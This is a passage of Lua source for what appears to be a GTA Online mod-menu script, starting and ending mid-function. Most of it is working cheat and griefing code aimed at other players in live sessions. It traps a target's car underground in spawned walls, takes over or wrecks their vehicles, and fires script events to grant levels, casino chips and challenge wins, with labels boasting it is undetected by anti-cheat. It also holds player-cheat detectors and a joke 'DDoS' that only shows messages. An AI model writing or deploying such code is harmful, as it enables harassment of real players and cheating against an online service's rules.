        local defx = c.x
        local defy = c.y 
        local defz = c.z
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, true)
        if PED.IS_PED_IN_ANY_VEHICLE(p, false) then
            STREAMING.REQUEST_MODEL(floorbr)
            while not STREAMING.HAS_MODEL_LOADED(floorbr) do
                STREAMING.REQUEST_MODEL(floorbr)
                util.yield()
            end
            STREAMING.REQUEST_MODEL(wallbr)
            while not STREAMING.HAS_MODEL_LOADED(wallbr) do
                STREAMING.REQUEST_MODEL(wallbr)
                util.yield()
            end
            RequestControl(veh)
            local success, floorcoords
            repeat
                success, floorcoords = util.get_ground_z(c.x, c.y)
                util.yield()
            until success
            c.z = floorcoords - 100
            ENTITY.SET_ENTITY_COORDS(veh, c.x, c.y, c.z, false, false, false, false)

            local c = ENTITY.GET_ENTITY_COORDS(p)
            local defz = c.z
            c.z = defz - 2
            local spawnedfloorbr = entities.create_object(floorbr, c)
            c.z = c.z + 10
            local spawnedroofbr = entities.create_object(floorbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedroofbr, 180.0, 0.0, 0.0, 1, true)

            defz = c.z - 5
            c.x = c.x + 4
            c.z = defz
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x - 8
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 8
            c.x = defx + 10.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 14.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 7.2
            c.x = defx + 3.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = defy + 6.5
            c.x = defx + 11
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = defx - 12
            c.y = defy + 4
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = defy - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 10
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = defy - 10
            c.x = defx - 19
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = defx - 3
            c.y = defy + 6.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = defx + 25
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x + 7
            c.y = defy
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = defy - 14.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 7
            c.x = c.x - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 7
            c.x = c.x - 7.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x - 6.5
            c.y = c.y - 6.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x - 7.5
            c.y = c.y - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x - 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x - 6.5
            c.y = c.y + 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x - 7.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x - 6.5
            c.y = c.y + 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y + 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y + 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y + 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 3.1
            c.x = c.x + 5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            util.yield(500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
            util.yield(500)
            entities.delete_by_handle(veh)
        else
            util.toast(players.get_name(player_id).. " Not in a vehicle")
        end
    end)

    control_veh_cmd = menu.toggle(trolling, "Control player vehicle", {}, "It only works on land vehicles.", function(toggle)
        control_veh = toggle

        while control_veh do 
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
            local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            local player_veh = PED.GET_VEHICLE_PED_IS_IN(ped)
            local class = VEHICLE.GET_VEHICLE_CLASS(player_veh)
            if not players.exists(player_id) then util.stop_thread() end

            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) > 1000.0 
            and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
                util.toast("Player far away.")
                menu.set_value(control_veh_cmd, false)
            return end

            if class == 15 then
                util.toast("The player is in a helicopter.")
                menu.set_value(control_veh_cmd, false)
            break end
            
            if class == 16 then
                util.toast("The player is in a plane.")
                menu.set_value(control_veh_cmd, false)
            return end

            if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
                if PAD.IS_CONTROL_PRESSED(0, 34) then
                    while not PAD.IS_CONTROL_RELEASED(0, 34) do
                        TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 7, 100)
                        util.yield()
                    end
                elseif PAD.IS_CONTROL_PRESSED(0, 35) then
                    while not PAD.IS_CONTROL_RELEASED(0, 35) do
                        TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 8, 100)
                        util.yield()
                    end
                elseif PAD.IS_CONTROL_PRESSED(0, 32) then
                    while not PAD.IS_CONTROL_RELEASED(0, 32) do
                        TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 23, 100)
                        util.yield()
                    end
                elseif PAD.IS_CONTROL_PRESSED(0, 33) then
                    while not PAD.IS_CONTROL_RELEASED(0, 33) do
                        TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 28, 100)
                        util.yield()
                    end
                end
            else
                util.toast("The player is not in a vehicle. :/")
                menu.set_value(control_veh_cmd, false)
            end
            util.yield()
        end
    end)

    menu.action(trolling, "DDoS", {}, "Super real", function()
        util.toast("A ddos attack was sent to" ..players.get_name(player_id))
        local percent = 0
        while percent <= 100 do
            util.yield(100)
            util.toast(percent.. "% done")
            percent = percent + 1
        end
        util.yield(3000)
        util.toast("Just kidding, what did you expect?")
    end)


    menu.toggle_loop(friendly, "Silent Godmode", {}, "Not Detected Free Mod Menus", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(ped), true, true, true, true, true, false, false, true)
        end, function() 
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(ped), false, false, false, false, false, false, false, false)
    end)

    menu.action(friendly, "Give level 25", {}, "It gives them level 25 approx", function()
        util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x5, 0, 1, 1, 1})
        for i = 0, 9 do
            util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x0, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x1, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x3, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0xA, i, 1, 1, 1})
        end
        for i = 0, 1 do
            util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x2, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x6, i, 1, 1, 1})
        end
        for i = 0, 19 do
            util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x4, i, 1, 1, 1})
        end
        for i = 0, 99 do
            util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x9, i, 1, 1, 1})
            util.yield()
        end
    end)

    menu.toggle_loop(friendly, "Give Casino Chips", {"dropchips"}, "It is tested for 3 weeks and seems safe, however it can be detected at any time", function(toggle)
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(p)
        STREAMING.REQUEST_MODEL(card)
        while not STREAMING.HAS_MODEL_LOADED(card) do
            STREAMING.REQUEST_MODEL(card)
            util.yield()
        end
        OBJECT.CREATE_AMBIENT_PICKUP(pickup, pos.x, pos.y, pos.z, 0, false, card, true, false) --spawn casino chips
        if not STREAMING.HAS_MODEL_LOADED(card) then
            util.toast("Failed to load model")
        end
    end)

    menu.action(friendly, "Give life and armor", {}, "", function()
        menu.trigger_commands("autoheal"..players.get_name(player_id))
    end)

    menu.action(friendly, "Win Crimial Damange", {}, "always win the challenge", function()
        local fcartable = {}

        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        local defz = c.z
        STREAMING.REQUEST_MODEL(expcar)
        while not STREAMING.HAS_MODEL_LOADED(expcar) do
            STREAMING.REQUEST_MODEL(expcar)
            util.yield()
        end
        STREAMING.REQUEST_MODEL(floorbr)
        while not STREAMING.HAS_MODEL_LOADED(floorbr) do
            STREAMING.REQUEST_MODEL(floorbr)
            util.yield()
        end
        local success, floorcoords
        repeat
            success, floorcoords = util.get_ground_z(c.x, c.y)
            util.yield()
        until success
        floorcoords = floorcoords - 100
        c.z = floorcoords
        local floorrigp = entities.create_object(floorbr, c)
        c.z = defz
        c.z = c.z - 95 
        for i = 1, 22 do
            fcartable[#fcartable + 1] = entities.create_vehicle(expcar, c, 0) 
        end
        util.yield(1000)
        FIRE.ADD_OWNED_EXPLOSION(p, c.x, c.y, floorcoords, exp, 100.0, true, false, 1.0) 
        util.yield(500)
        entities.delete_by_handle(floorrigp)
        util.yield(1000)
        
        for i = 1, #fcartable do
            entities.delete_by_handle(fcartable[i]) 
            fcartable[i] = nil
        end
    end)

    menu.toggle_loop(friendly, "Earn Checkpoints", {}, "Win the challenge checkpoints", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        if PED.IS_PED_IN_ANY_VEHICLE(p) then
            local veh = PED.GET_VEHICLE_PED_IS_IN(p, true)
            RequestControl(veh)
            local dblip = HUD.GET_NEXT_BLIP_INFO_ID(431)
            local cdblip = HUD.GET_BLIP_COORDS(dblip)
            ENTITY.SET_ENTITY_COORDS(veh, cdblip.x, cdblip.y, cdblip.z, false, false, false, false)
            util.yield(1500)
        else
            util.toast(players.get_name(player_id).. " Must be in a vehicle")
        end
    end)


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- Vehicle


    menu.action(vehicle, "Repair Vehiculo", {}, "Repair the vehicle", function(toggle)
        local player_ped = PLAYER.GET_PLAYER_PED(player_id)
        local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(player_ped, include_last_vehicle_for_player_functions)
        if NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_vehicle) then
            VEHICLE.SET_VEHICLE_FIXED(player_vehicle)
            util.toast(players.get_name(player_id) .. " Repaired vehicle")
        else
            util.toast(" Control of the vehicle could not be obtained or the player is not in a vehicle.")
        end
    end)

   	menu.action(vehicle, "Disable Vehicle", {}, "It's better than stand", function(toggle)
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
        if (PED.IS_PED_IN_ANY_VEHICLE(p)) then
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
        else
            local veh2 = PED.GET_VEHICLE_PED_IS_TRYING_TO_ENTER(p)
            entities.delete_by_handle(veh2)
        end
    end)

   menu.toggle_loop(vehicle, "Disable Vehicle Loop", {}, "It's better than stand", function(toggle)
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
        if (PED.IS_PED_IN_ANY_VEHICLE(p)) then
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
        else
            local veh2 = PED.GET_VEHICLE_PED_IS_TRYING_TO_ENTER(p)
            entities.delete_by_handle(veh2)
        end
    end)

    menu.action(vehicle, "Disable Vehicle V2", {}, "Unblockable by stand '10/02'", function(toggle)
        local player_ped = PLAYER.GET_PLAYER_PED(pid)
        local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(player_ped, include_last_vehicle_for_player_functions)
        local is_running = VEHICLE.GET_IS_VEHICLE_ENGINE_RUNNING(player_vehicle)
        if NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_vehicle) then
            VEHICLE.SET_VEHICLE_ENGINE_HEALTH(player_vehicle, -10.0)
            util.toast(players.get_name(player_id) .. "Enigne Fucked")
        else
            util.toast("Could not gain control of the vehicle or the player is not in a vehicle")
        end
    end)


end)

	
    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    -- Other
    menu.action(otherc, "See Players Waypoint", {}, "It should show the mark that the player has on the map.", function()    
        local playerw = players.get_waypoint(player_id)
        for i = 1, 5 do
            HUD.REFRESH_WAYPOINT()
        end
        HUD.SET_NEW_WAYPOINT(playerw.x, playerw.y, false)
        util.yield(2000)
        util.toast("The player's mark should already be on the map.")
        util.yield(500)
        util.toast("Maybe it doesn't have a mark if it doesn't come out.")
    end)
	
	
end)



menu.slider(world, "Local Transparency", {"transparency"}, "It doesn't work very well now, I'll try to fix it later", 0, 100, 100, 20, function(value)
    if value > 80 then
        ENTITY.RESET_ENTITY_ALPHA(players.user_ped())
    else
        ENTITY.SET_ENTITY_ALPHA(players.user_ped(), value * 2.55, false)
    end
end)

local s_forcefield_range = 10
local s_forcefield = 0
local s_forcefield_names = {
    [0] = "Push",
    [1] = "Pull"
}

menu.toggle_loop(world, "Force Field", {"sforcefield"}, "", function()
    if players.exists(players.user()) then
        local _entities = {}
        local player_pos = players.get_position(players.user())

        for _, vehicle in pairs(entities.get_all_vehicles_as_handles()) do
            local vehicle_pos = ENTITY.GET_ENTITY_COORDS(vehicle, false)
            if v3.distance(player_pos, vehicle_pos) <= s_forcefield_range then
                table.insert(_entities, vehicle)
            end
        end
        for _, ped in pairs(entities.get_all_peds_as_handles()) do
            local ped_pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            if (v3.distance(player_pos, ped_pos) <= s_forcefield_range) and not PED.IS_PED_A_PLAYER(ped) then
                table.insert(_entities, ped)
            end
        end
        for i, entity in pairs(_entities) do
            local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
            local entity_type = ENTITY.GET_ENTITY_TYPE(entity)

            if NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity) and not (player_vehicle == entity) then
                local force = ENTITY.GET_ENTITY_COORDS(entity)
                v3.sub(force, player_pos)
                v3.normalise(force)

                if (s_forcefield == 1) then
                    v3.mul(force, -1)
                end
                if (entity_type == 1) then
                    PED.SET_PED_TO_RAGDOLL(entity, 500, 0, 0, false, false, false)
                end

                ENTITY.APPLY_FORCE_TO_ENTITY(
                    entity, 3, force.x, force.y, force.z, 0, 0, 0.5, 0, false, false, true, false, false
                )
            end
        end
    end
end)

menu.action(world, "Clear Area", {"cleararea"}, "Clean everything in the area", function(on_click)
    clear_area(clear_radius)
    util.toast('Area limpia:3')
end)

menu.action(world, "Clear World", {"clearworld"}, "Literally cleans everything in the area including peds, cars, objects, bools etc.", function(on_click)
    clear_area(1000000)
    util.toast('Mundo limpio :3')
end)

menu.slider(world, "Cleaning radius", {}, "Cleaning radio", 100, 10000, 100, 100, function(s)
    radius = s
end)


--------------------------------------------------------------------------------------------------------------------------------
--Detecciones
menu.toggle_loop(detections, "GodMode", {}, "It will detect if player has godmode.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        for i, interior in ipairs(interior_stuff) do
            if (players.is_godmode(player_id) or not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(ped)) and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(player_id) ~= 0 and get_interior_player_is_in(player_id) == interior then
                util.draw_debug_text(players.get_name(player_id) .. " Has Godmode")
                break
            end
        end
    end 
end)

menu.toggle_loop(detections, "Vehicle Godmode", {}, "It will detect if the car is godmode.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            for i, interior in ipairs(interior_stuff) do
                if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(player_veh) and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(player_id) ~= 0 and get_interior_player_is_in(player_id) == interior then
                    util.draw_debug_text(players.get_name(player_id) .. " Car with Godmode")
                    break
                end
            end
        end
    end 
end)

menu.toggle_loop(detections, "Modded Weapon", {}, "Tell if you have any weapon mods", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        for i, hash in ipairs(modded_weapons) do
            local weapon_hash = util.joaat(hash)
            if WEAPON.HAS_PED_GOT_WEAPON(ped, weapon_hash, false) and (WEAPON.IS_PED_ARMED(ped, 7) or TASK.GET_IS_TASK_ACTIVE(ped, 8) or TASK.GET_IS_TASK_ACTIVE(ped, 9)) then
                util.toast(players.get_name(player_id) .. " Is using weapon mod")
                break
            end
        end
    end
end)

menu.toggle_loop(detections, "Modded Car", {}, "Tell if you have any car mods", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(player_id)
        for i, name in ipairs(modded_vehicles) do
            if modelHash == util.joaat(name) then
                util.draw_debug_text(players.get_name(player_id) .. " Has Modded Car")
                break
            end
        end
    end
end)

menu.toggle_loop(detections, "Weapon In Interior", {}, "detects if you use a gun indoors", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        if players.is_in_interior(player_id) and WEAPON.IS_PED_ARMED(player, 7) then
            util.draw_debug_text(players.get_name(player_id) .. " Has a gun indoors")
            break
        end
    end
end)

menu.toggle_loop(detections, "It's a hacker", {}, "Detects if the player is about to ban", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local reason = NETWORK.NETWORK_PLAYER_GET_CHEATER_REASON(player_id)
        if NETWORK.NETWORK_PLAYER_IS_CHEATER(player_id) then
            util.draw_debug_text(players.get_name(player_id) .. " They are about to ban him :u, reason:", reason)
            break
        end
    end
end)

menu.toggle_loop(detections, "Running Fast", {}, "Detect if you run faster", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local ped_speed = (ENTITY.GET_ENTITY_SPEED(ped)* 2.236936)
        if not util.is_session_transition_active() and get_interior_player_is_in(player_id) == 0 and get_transition_state(player_id) ~= 0 and not PED.IS_PED_DEAD_OR_DYING(ped) 
        and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_IN_ANY_VEHICLE(ped, false)
        and not TASK.IS_PED_STILL(ped) and not PED.IS_PED_JUMPING(ped) and not ENTITY.IS_ENTITY_IN_AIR(ped) and not PED.IS_PED_CLIMBING(ped) and not PED.IS_PED_VAULTING(ped)
        and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) <= 300.0 and ped_speed > 30 then -- fastest run speed is about 18ish mph but using 25 to give it some headroom to prevent false positives
            util.toast(players.get_name(player_id) .. " Is Using Super Run")
            break
        end
    end
end)

menu.toggle_loop(detections, "Noclip", {}, "Detects if the player is levitating/noclip", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local ped_ptr = entities.handle_to_pointer(ped)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local oldpos = players.get_position(player_id)
        util.yield()
        local currentpos = players.get_position(player_id)
        local vel = ENTITY.GET_ENTITY_VELOCITY(ped)
        if not util.is_session_transition_active() and players.exists(player_id)
        and get_interior_player_is_in(player_id) == 0 and get_transition_state(player_id) ~= 0
        and not PED.IS_PED_IN_ANY_VEHICLE(ped, false) -- too many false positives occured when players where driving. so fuck them. lol.
        and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped)
        and not PED.IS_PED_CLIMBING(ped) and not PED.IS_PED_VAULTING(ped) and not PED.IS_PED_USING_SCENARIO(ped)
        and not TASK.GET_IS_TASK_ACTIVE(ped, 160) and not TASK.GET_IS_TASK_ACTIVE(ped, 2)
        and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) <= 395.0 -- 400 was causing false positives
        and ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(ped) > 5.0 and not ENTITY.IS_ENTITY_IN_AIR(ped) and entities.player_info_get_game_state(ped_ptr) == 0
        and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z 
        and vel.x == 0.0 and vel.y == 0.0 and vel.z == 0.0 then
            util.toast(players.get_name(player_id) .. " Is Using Noclip")
            break
        end
    end
end)

menu.toggle_loop(detections, "Spectating", {}, "Detect if you or someone else is spectating", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        for i, interior in ipairs(interior_stuff) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
            if not util.is_session_transition_active() and get_transition_state(player_id) ~= 0 and get_interior_player_is_in(player_id) == interior
            and not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped) then
                if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_cam_pos(player_id)) < 15.0 and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) > 20.0 then
                    util.toast(players.get_name(player_id) .. " Is watching you")
                    break
                end
            end
        end
    end
end)

menu.toggle_loop(detections, "Teleport", {}, "Detect if the player teleports", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        if not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped) then
            local oldpos = players.get_position(player_id)
            util.yield(1000)
            local currentpos = players.get_position(player_id)
            for i, interior in ipairs(interior_stuff) do
                if v3.distance(oldpos, currentpos) > 500 and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z 
                and get_transition_state(player_id) ~= 0 and get_interior_player_is_in(player_id) == interior and PLAYER.IS_PLAYER_PLAYING(player_id) and player.exists(player_id) then
                    util.toast(players.get_name(player_id) .. "  He just teleported")
                end
            end
        end
    end
end)

menu.toggle_loop(detections, "Vote To Kick", {}, "It detects if they vote to expel someone from the session very quickly and warns.  Better known as 'smart kick' on stand.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local kickowner = NETWORK.NETWORK_SESSION_GET_KICK_VOTE(player_id)
        local kicked = NETWORK.NETWORK_SESSION_KICK_PLAYER(player_id)
        if kicked then
            util.draw_debug_text(players.get_name(player_id) .. " The player", kicked, "has been kicked by:", kickowner)
            break
        end
    end
end)
--------------------------------------------------------------------------------------------------------------------------------
--Online

menu.toggle_loop(online, "Addict SH", {}, "You become addicted to the host script", function()
